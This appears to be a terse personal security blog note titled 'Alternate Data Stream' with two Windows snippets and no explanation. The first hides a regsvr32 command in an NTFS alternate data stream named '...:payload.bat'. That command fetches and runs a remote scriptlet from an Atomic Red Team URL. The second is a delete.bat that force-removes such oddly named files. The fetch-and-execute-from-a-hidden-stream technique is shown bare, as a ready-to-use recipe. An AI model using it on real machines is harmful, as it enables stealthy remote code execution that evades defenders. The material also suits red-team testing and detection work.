---
author: XhstormR
categories:
- security
date: 2019-09-30T19:31:07+08:00
title: Alternate Data Stream
---

<!--more-->

Updated on 2019-09-30

```bash
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > ...:payload.bat

cmd.exe - < ...:payload.bat
```

### delete.bat
```bash
DEL /F /A /Q \\?\%1
RD /S /Q \\?\%1
```
